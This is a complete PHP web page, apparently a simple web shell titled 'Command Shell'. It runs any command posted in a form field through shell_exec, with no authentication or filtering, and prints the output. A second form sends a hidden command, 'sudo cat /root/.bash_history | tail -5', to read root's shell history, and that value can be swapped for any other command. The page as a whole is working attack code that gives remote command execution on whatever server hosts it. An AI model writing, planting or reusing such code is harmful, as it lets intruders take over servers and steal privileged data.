<html>
<head>
<link rel="stylesheet" href="n.css"></link>
</head>
<body>
 <center><b><h1 id="ni">Command Shell</h1></b></center>
<hr>
Enter a shell command to execute in the text field below. The cd command may be used to change directory for subsequent commands.
<form method="post">
<p>Execute command </p>
<input name="cmd" type="text" placeholder="command">

<input name="smt"type="submit" value="execute">
</form>
<?php
if(isset($_POST['smt']))
{
 $a=$_POST['cmd'];
 $o=shell_exec($a);
 echo "<div id='n'>";echo $o;echo "</div>";
 }
 ?>
 <h3>History of Command shells</h3>
<form method="post">

<input value="sudo cat /root/.bash_history | tail -5" type="hidden" name="cmdi" type="text" placeholder="command">

<input name="smti" type="submit" value="history">
</form>
<?php
if(isset($_POST['smti']))
{
 $a=$_POST['cmdi'];
 $o=shell_exec($a);
 echo "<div id='n'>";echo $o;echo "</div>";
 }
 ?>
</html>
